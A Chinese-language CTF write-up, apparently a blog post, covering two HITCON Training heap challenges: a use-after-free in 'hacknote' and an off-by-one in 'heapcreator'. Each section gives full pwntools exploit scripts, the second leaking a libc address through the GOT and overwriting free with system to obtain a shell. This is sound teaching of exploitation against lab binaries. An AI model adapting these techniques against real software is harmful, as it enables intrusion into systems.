---
layout:		post
title:		HITCON Training writeup
author:		wooy0ung
tags:		pwn
category: 	writeup
---

- 目录
{:toc #markdown-toc}

>[索引目录]  
>0x010 hacknote(uaf)  
>0x013 heapcreator(off by one)  
<!-- more -->


## 0x010 hacknote(uaf)

delete操作没有清空指针，导致的uaf。程序malloc了8 byte的fastbin存函数指针以及size
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x010-001.png)

show操作call了该指针，把chunk的函数指针劫持到magic打印出flag
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x010-002.png)

exp.py
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

s = process("./hacknote")
elf = ELF("./hacknote")

def add(con):
	s.sendlineafter("Your choice :","1")
	s.sendlineafter("size :",str(len(con)))
	s.sendlineafter("Content :",con)

def show(idx):
	s.sendlineafter("Your choice :","3")
	s.sendlineafter("Index :",str(idx))

def delete(idx):
	s.sendlineafter("Your choice :","2")
	s.sendlineafter("Index :",str(idx))

magic_addr = 0x08048986

add("A"*0x40)
add("A"*0x40)
add("A"*0x40)

delete(0)
delete(1)

add(p32(magic_addr))
show(0)
s.interactive()
```
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x010-003.png)


## 0x013 heapcreator(off by one)

指针被清空，不能利用uaf
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x013-001.png)

edit操作读取size+1 byte，造成off by one
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x013-002.png)

申请chunk0、chunk1，确保chunk1与该处malloc的size相同，off by one修改掉chunk1的size位
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x013-003.png)

free掉chunk1，再请求分配2*size-0x10的chunk，该chunk的content就会包含存放ptr、size位的结构
可以leak出got表地址
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x013-004.png)

exp.py
```
from pwn import *

s = process("./heapcreator")
elf = ELF("./heapcreator")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size,con):
	s.sendlineafter("Your choice :","1")
	s.sendlineafter("Size of Heap : ",str(size))
	s.sendlineafter("Content of heap:",con)

def edit(idx,con):
	s.sendlineafter("Your choice :","2")
	s.sendlineafter("Index :",str(idx))
	s.sendlineafter("Content of heap : ",con)

def show(idx):
	s.sendlineafter("Your choice :","3")
	s.sendlineafter("Index :",str(idx))

def delete(idx):
	s.sendlineafter("Your choice :","4")
	s.sendlineafter("Index :",str(idx))

free_got = elf.got["free"]

create(0x18,"AAAA")
create(0x10,"AAAA")
edit(0,"/bin/sh\x00"+"A"*0x10+"\x41")

delete(1)

create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
show(1)

s.recvuntil("Content : ")
data = s.recvuntil("\n")[:-1]
free_addr = u64(data.ljust(8,"\x00"))
log.info("free_addr: %#x",free_addr)

libc_base = free_addr - libc.symbols["free"]
system_addr = libc.symbols["system"] + libc_base
log.info("system_addr: %#x",system_addr)

edit(1,p64(system_addr))
delete(0)

s.interactive()
```